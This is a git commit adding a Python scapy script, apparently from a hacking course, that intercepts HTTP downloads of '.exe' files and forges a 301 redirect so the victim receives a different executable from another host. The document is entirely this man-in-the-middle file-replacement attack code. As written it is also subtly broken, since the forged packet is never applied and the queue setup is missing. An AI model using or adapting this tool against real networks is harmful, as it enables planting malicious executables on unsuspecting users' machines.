7768f3dec1d5f157046d0b702dcafe4a3c3c76b6
sudhxan <hariharasudhan.nitt@gmail.com>
2021-03-08 20:36:06 -0500

    Initial Commit

---
+++ file_interceptor.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+        packet[scapy.Raw].load = load
+        del packet[scapy.IP].len
+        del packet[scapy.IP].chksum
+        del packet[scapy.TCP].chksum
+        return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+] exe REQUEST")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing File")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 MOVED PERMANENTLY\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\\n\n")
+
+    packet.accept()
